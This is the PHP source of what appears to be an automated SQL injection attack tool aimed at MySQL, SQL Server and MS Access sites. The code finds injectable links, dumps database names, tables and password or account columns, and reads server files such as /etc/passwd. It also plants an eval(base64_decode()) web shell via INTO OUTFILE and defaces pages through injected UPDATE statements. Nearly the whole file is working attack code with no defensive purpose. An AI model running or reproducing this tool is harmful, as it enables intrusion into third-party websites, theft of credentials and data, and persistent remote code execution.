<?php

//================ Functions & Included files ===================
include("inc/var.php");
include("inc/fun.php");
include("inc/hdr.php");

//================ MAIN PROGRAM ===================

if (!isset($_POST["send"]) && !isset($_POST["url"])) {
    _print();
    exit;
} elseif (isset($_POST["send"]) && empty($_POST["url"])) {
    $result="<red> No link provided..";
    _print($result);
    exit;
}

//============== TEST OPTION =================

if ($_POST['choice']=='test') {
    $choice="TEST sql inection";
    if (!inj_make(0)) {
        $result="<red>NO WAY!";
        _print($result);
        exit;
    } else {
        $result="<green>[+] Vulnerable Link";
        $found=true;
        if (isset($_POST['info'])) {
            list($version, $query)=explode("-)(-", getexploit(array("veRsIon()","",""), 1));
            if (!empty($version)) {
                $result.="\n[-] Version <=> ".$version;
                $result.="\n[-] Database <=> ".getexploit(array("datAbAse()","",$query), 0);
                $result.="\n[-] User <=> ".getexploit(array("usEr()","",$query), 0);
            } else {
                $result.="Cannot get database version";
            }
        }
    }

    //============== MAKE INJECTION OPTION =================
    if (isset($_POST['make']) && $found) {
        $choice.=" - Make InjEction";

        if (!empty($query)) { //so 'info' has been checked
            $query=preg_replace("/concat\(0x232523,|,0x232523\)/i", "", $query);
            list($link, $query, $com)=explode("@-@", $query);
        } else { // no I'm wrong!

            list($version, $query)=explode("-)(-", getexploit(array("veRsIon()","",""), 1));
            $query=preg_replace("/concat\(0x232523,|,0x232523\)/i", "", $query);
            list($link, $query, $com)=explode("@-@", $query);
        }
        $result.= "\n[+] Explo!t <=> ".$link.$query.$com;

        if (!empty($version)) {
            $result.= "\n[+] Type <=> Classic SQLi";
        } else {
            $result.= "\n[+] Type <=> Blind SQLi";
        }
    }
}

//============== [MySQL All Versions] Blind SQL Injection =================

if ($_POST['choice'] == 'chk_blind') {

    if (isset($_POST["blind_all"]) && isset($_POST["blind_select"])) {
        _print("<red>You cannot select both options..");
        exit;
    }
    if (isset($_POST["blind_all"])) {
        $tables_chars = get_tables();
        if ($tables_chars == false) {
            $result="<red>NO WAY!";
            _print($result);
            exit;
        }
        else {
            $result="<green>[+] Blind SQL injection discovered... you can proceed with SQL exploits";
            foreach ($tables_chars as $tbl_name => $columns) {
                $result.="\nTable - ".$tbl_name;
                foreach ($columns as $col_no => $column) {
                    $result.="\n ---- Column($col_no) - ".$column;
                }
                $result.="\n---------------";
            }
        }
    }
    elseif (isset($_POST["blind_select"])) {
        if (!empty($_POST["tbl_name"]) && !empty($_POST["col_name"]) && !empty($_POST["rows_no"])) {
            $tbl_name = $_POST["tbl_name"];
            $col_name = $_POST["col_name"];
            $rows_no = (int)$_POST["rows_no"];
        }
        else {
            _print("<red>All info should be provided");
            exit;   
        }
        $column_chars = get_rows($tbl_name,$col_name,$rows_no);
        if ($column_chars == false) {
            $result="<red>Cannot get any record!";
            _print($result);
            exit;
        }
        else {
            $result="<green>[+] Injection is under process.. please wait...";
            foreach ($column_chars as $key => $cell_chars) {
                $cell_chars[$key] = implode(array_map("chr", $cell_chars));
                $result.="\nRecrods found: ".$cell_chars[$key];
            }
        }
    }
    else {
        _print("<red>None of the options selected..");
        exit;
    }
    _print($result);
    exit;
}

//============== [MySQL5] Fetch OPTION =================
if ($_POST['choice']=='chk_mysql5') {
    $choice="fetch tables [mysql5]";
    $col1="%pass%";
    $col2="%pwd%";
    $sc="mysql";
    $colE1=encrypt($col1, 0);
    $colE2=encrypt($col2, 0);
    $info_schemaCH = encrypt("information_schema", 0);
    $account = encrypt("%account%", 0);
    $scH=encrypt($sc, 0);
    $i=0;
    $searchQ="+fRom+inFormation_sChema.coLumns+whEre+coLumn_name+lIke+$colE1+";
    $searchQ1="+fRom+inFormation_sChema.coLumns+whEre+";

    if (!isset($_POST['accounts']) && !isset($_POST['spec']) && !isset($_POST['blind'])) { // searching inside current db only.
        list($schm, $query)=explode("-)(-", getexploit(array("database()","",""), 1));
        
        if (empty($schm)) {
            $result.="<red>Failed Get Database";
        } else {
            $result.="<green>Connect Successfuly\n";
        }
            
        $result.="DATABASE: ".$schm;
        
        $tbl=getexploit(array("group_concat(taBle_name)",$searchQ."aNd+taBle_schema=database()",$query), 0);

        if (!empty($tbl)) {
            if (strpos($tbl, ',')==false) {
                $result.= "\n\nTABLE: ".$tbl."\n";
                $tableH=encrypt($tbl, 0);
                $cols=getexploit(array("group_concat(coLumn_name)",$searchQ1."taBle_sChema=database()+aNd+taBle_name=$tbl",$query), 0);
                $columns=explode(",", $cols);
                $result.= "\nCOLUMN: \n";
                for ($t=0;$t<count($columns);$t++) {
                    $result.= "\t".$columns[$t]."\n";
                }
            } else {
                $tables=explode(",", $tbl);
                $tables=array_unique($tables);
                
                for ($k=0;$k<count($tables)-1;$k++) {
                    $tabl[$k]=current($tables);
                    $tabl[$k+1]=next($tables);
                }
                
                for ($j=0;$j<count($tabl);$j++) {
                    $result.= "\n\nTABLE: ".$tabl[$j]."\n";
                    $tableH=encrypt($tabl[$j], 0);
                    $cols=getexploit(array("group_concat(coLumn_name)",$searchQ1."taBle_sChema=database()+aNd+taBle_name=$tabl[$j]",$query), 0);
                    $columns=explode(",", $cols);
                    $result.= "\nCOLUMN: \n";
                    
                    for ($t=0;$t<count($columns);$t++) {
                        $result.= "\t".$columns[$t]."\n";
                    }
                        
                    $result.= "\n=--------=";
                }
            }
        } else {
            $result.= "Current database hasn't account tables, use 'Fetching from all DBs' option";
        }
    }

    if (isset($_POST['accounts'])) {
        list($dbs, $query)=explode("-)(-", getexploit(array("group_concat(taBle_sChema)",$searchQ."aNd+taBle_schema!='$sc'+aNd+taBle_schema!='performance_schema'+aNd+taBle_schema!='sys'",""), 1));

        if (empty($dbs)) {
            $result="<red>Failed Get Database";
            _print($result);
            exit;
        }
        $result="<green>Connect Successfuly\n";

        $schema=explode(",", $dbs);
        $schema=array_unique($schema);

        for ($k=0;$k<count($schema);$k++) {
			$schm[$k]=current($schema);
            if (next($schema) == false) {
                break;
            }
            $schm[$k+1]=next($schema);
        }
        for ($i=0;$i<count($schm);$i++) {
            $result.= "DATABASE: ".$schm[$i];
            $schemaH=encrypt($schm[$i], 0);
            $tbl=getexploit(array("group_concat(taBle_name)",$searchQ."aNd+taBle_sChema='$schm[$i]'",$query), 0);
        
            if (strpos($tbl, ',')==false) {
                $result.= "\n\nTABLE: $tbl\n";
                $tableH=encrypt($tbl, 0);
                $cols=getexploit(array("group_concat(coLumn_name)",$searchQ1."taBle_sChema='$schm[$i]'+aNd+taBle_name='$tbl'",$query), 0);
                $columns=explode(",", $cols);
                $result.= "\nCOLUMN: \n";
                for ($t=0;$t<count($columns);$t++) {
                    $result.= "\t".$columns[$t]."\n";
                }
            } else {
                $tables=explode(",", $tbl);
                $tables=array_unique($tables);
                for ($k=0;$k<count($tables)-1;$k++) {
                    $tabl[$k]=current($tables);
                    $tabl[$k+1]=next($tables);
                }
                for ($j=0;$j<count($tabl);$j++) {
                    $result.= "\n\nTABLE: ".$tabl[$j]."\n";
                    $tableH=encrypt($tabl[$j], 0);
                    $cols=getexploit(array("group_concat(coLumn_name)",$searchQ1."taBle_sChema='$schm[$i]'+aNd+taBle_name='$tabl[$j]'",$query), 0);
                    $columns=explode(",", $cols);
                    $result.="\nCOLUMN: \n";
                    for ($t=0;$t<count($columns);$t++) {
                        $result.="\t".$columns[$t]."\n";
                    }
                    $result.="\n=--------=";
                }
            }
            $result.="\n=-=-=-=-=-=-=-=-=-=\n\n";
        }
    }

}

//============== [MySQL4] Bruforcing OPTION =================
if ($_POST['choice']=='chk_mysql4') {
    $choice="fetch tables [mysql4]";
    list($help, $query, $com)=explode(" ", inj_make(1));
    if (isset($_POST["tblpre"])) {
        $tblpre=$_POST["tblpre"]."_";
    } else {
        $tblpre="";
    }
    if (isset($_POST["colpre"])) {
        $colpre=$_POST["colpre"]."_";
    } else {
        $colpre="";
    }
    $true="and 1=1";
    $fetchTr=request($help.$true.$com);
    $i=0;
    for ($i=0; $i<count($tables); $i++) {
        $req_arr_tbls[$i] = $help.$query."+fRom+".$tblpre.$tables[$i]."+lImIt+0,1+".$com;
    }
    $pages_arr_tbls = multi_request($req_arr_tbls);
    $j=0;
    if (strlen($ergT)==strlen($fetchTr)) {
        for ($i=0; $i<count($tables); $i++) {
            if (empty($tbl)) {
                $result.="<red>No tables fetched\n";
            }

            if (empty($col)) {
                $result.="<red>No columns fetched\n";
            }
            _print($result);
            exit;
        }
    }
}
//============== GET FILE OPTION =================

if ($_POST['choice']=='passwd') {
    $choice="Fetch Files";

    if (empty($_POST['file'])) {
        $file='/etc/passwd';
    } else {
        $file=$_POST['file'];
    }
    
    $path="load_file(".encrypt($file, 0).")";
    list($source, $query)=explode("-)(-", getexploit(array($path,"","")), 1);
    $result="<green>source: $source";
    if (!empty($source)) {
        $result.="source: ".$source;
    } else {
        $result="<red>failed fetch file";
        _print($result);
        exit;
    }
}


//============== InjEct FILE OPTION =================
if ($_POST['choice']=='injfile') {
    $choice="Into Outfile";
    $flag=false;
    $path=$_POST['pathcr'];
    $code=$_POST['code'];
    if (empty($path)) {
        $result="<red>Specify the path you want to inject";
        _print($result);
        exit;
    } else {
        $path=explode("\n", $path);
        //1st of all, I need to check ability to inject file
        $hash=encrypt('sqlrobot', 0);
        list($request, $query)=explode("-)(-", getexploit(array($hash,"+inTo+ouTfIle+'d:/inj.txt'","")), 1);
        $load=getexploit(array("load_file('d:/inj.txt')","",$query), 0);
        if (!empty($load)) {
            foreach ($path as $dir) {
                $subpath[$i]=preg_replace("/.+(www|public_html)\/([0-9a-z\-]*)$/", "$2", $dir);
                $dir=preg_replace('/([0-9a-z\-\.\/]+)([^0-9a-z\-\.\/]*)$/', "$1", $dir);
                $dir=preg_replace('/([0-9a-z])$/s', "$1/", $dir);
                $dir=preg_replace('/(.+)/', "$1inj.php", $dir);
                if (empty($code)) {
                    $code="<?eval(base64_decode(\$_REQUEST['inject']));?>";
                    $result="our code";
                    $flag=true;
                }
                $response=getexploit(array(encrypt($code, 0),"+inTo+ouTfIle+'".$dir."'",$query), 0);
                $dirH=encrypt($dir, 0);
                $load=getexploit(array("load_file($dirH)","",$query), 0);
                if (!empty($load)) {
                    $website=preg_replace("/(http:\/\/)([0-9a-z\.\-]*)(\/?).+\/+.*/i", "$1$2", $url);
                    $result.="file injected";
                    if ($flag==true) {
                        echo "inject=c3lzdGVtKGxzKTs=\n\"3lzdGVtKGxzKTs=\" = base64(system(ls);)";
                    }
                } else {
                    $result="<red>couldn't inject file";
                    _print($result);
                    exit;
                }
            }
        }
    }
}
//============== [SQL SERVER] Fetch OPTION =================
if ($_POST['choice']=='chk_asp') {
    $choice="GET for SQL SERVER";
    list($help, , $com)=explode(" ", inj_make(1));
    $hv=$help."+hAviNg+1=1".$com;
    $hv1="+hAvIng+1=1".$com;
    $ergG = request($hv);
    $i=0;
    if (preg_match("/Column '(.+)' is invalid/", $ergG)) {
        $gr=$help."+gRoUp+bY+";
        while (preg_match_all("/.+'(.+)' is invalid/", $ergG, $out)) {
            $col[$i++]=$out[1][0];
            $series=implode(",", $col);
            $query=$gr.$series.$hv1;
            $ergG=request($query);
            preg_match_all("/.+'(.+)' is invalid/", $ergG, $out);
        }
        //$result=$series;
        preg_match("/([0-9a-z_-]+)\..+/i", $series, $tbl);
        $result= "<green>Table: ".$tbl[1];
        for ($j=0;$j<count($col);$j++) {
            preg_match("/\.([0-9a-z_-]+).*/i", $col[$j], $column);
            $result.= "\n\t Column($j): ".$column[1]."\n";
        }
    } else {
        $result="<red>Failed exploit";
        _print($result);
        exit;
    }
}

//============== [SQL SERVER] UPDATE OPTION =================
if ($_POST['choice']=='updtchk') {
    $choice="UPDATE TABLE";
    list($help, , $com)=explode(" ", inj_make(1));
    $tbl=$_POST['tbl'];
    $col=$_POST['col'];
    $index=$_POST['index'];
    if (strpos($index, '/')) {
        $flag=true;
        $temp=$index;
        $tempH=encrypt($temp, 1);
        $index="sqlrobot";
    }
    $exe=request($help."+UpDate+$tbl+sEt+$col='$index'".$com);
    $exes=request($help."+oR+1=(sElEct+top+1+$col+fRom+$tbl)".$com);
    if (@preg_match_all("/'($index)'/", $exes, $out)) {
        $result="Page Attacked!";
        if ($flag) {
            $exe=request($help."+UpDate+$tbl+sEt+$col=$tempH".$com);
        }
    
        else {
            $result.="\n$out[1][0]";
        }
    } else {
        $indexH=encrypt($index, 1);
        $exe=request($help."+UpDate+$tbl+sEt+$col=$indexH".$com);
        $exes=request($help."+oR+1=(sElEct+top+1+$col+fRom+$tbl)".$com);
        if (@preg_match_all("/'($index)'/", $exes, $out)) {
            $result="<green>Page Attacked!";
            if ($flag) {
                $exe=request($help."+UpDate+$tbl+sEt+$col=$tempH".$com);
            }
            else {
                $result.="\n$out[1][0]";
            }
        } else {
            $result="<red>Failed Attack";
            $result.="\n$out[1][0]";
            _print($result);
            exit;
        }
    }
}

//============== [MS DBs] BruteForcing OPTION =================
if ($_POST['choice']=='bf_msdb') {
    $choice="bruteforce MS DBs";
    $i=0;
    $cBool=false;

    list($help, , $com)=explode(" ", inj_make(1)); //echo "help: $help\ncom: $com";
    $ReqER=request($url."'");

    foreach ($tables as $table) {
        $ReqTR=request($help."+aNd+1=1".$com);
        $j=0;
        //if(preg_match("/'(.+)'\./",$ReqTR)) continue;
  
        $ReqTbl=request($help."+aNd+(sElEct+top+1+1+fRom+$table)".$com);
  
        if (strlen($ReqTbl)==strlen($ReqTR)) {
            $tbl[$i++]=$table;
            $result="<green> tables found";
            $result.= "Table($i): $table";

            foreach ($columns as $column) {
                if (preg_match("/\[ODBC Microsoft Access Driver\]/", $ReqER)) {
                    $ReqCol=request($help."+aNd+(sElEct+top+1+$column+fRom+$table)".$com);
                } else {
                    $ReqCol=request($help."+aNd+1=(sElEct+top+1+$column+fRom+$table)".$com);
                }
                if (strlen($ReqCol)==strlen($ReqTR)) {
                    $col[$j++]=$column;
                    $result.= "\n\tColumn($j): $column\n";
                    if ($j==2) {
                        $cBool=true;
                        break;
                    }
                }
            }
            $result.= "\n=--------=\n\n";
        }
  
        if ($i==3) {
            break;
        }
        //if($cBool) break;
    }

    if (empty($tbl)) {
        $result="<red>There's no results";
        _print($result);
        exit;
    }

    if (empty($col)) {
        $result.= "<red>No columns found";
        _print($result);
        exit;
    }
}

if (!empty($result)) {
    _print($result);
}